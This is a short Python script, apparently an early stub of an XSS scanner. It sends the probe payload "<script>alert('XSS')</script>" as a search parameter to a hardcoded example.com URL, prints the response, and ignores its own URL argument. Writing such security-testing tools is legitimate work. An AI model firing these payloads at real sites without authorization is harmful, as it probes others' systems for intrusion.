import requests

def xss(URL, output):
    print("test xss")
    print("URL: "+URL)
    print("ot: "+str(output))
    

    url = "http://example.com/search"
    payload = "<script>alert('XSS')</script>"
    params = {'search': payload}

    response = requests.get(url, params=params)

    print(f"[+] Sent payload to: {response.url}")
    print(f"[+] HTTP Status: {response.status_code}")
    print("[+] Response Preview:")
    print(response.text[:500])
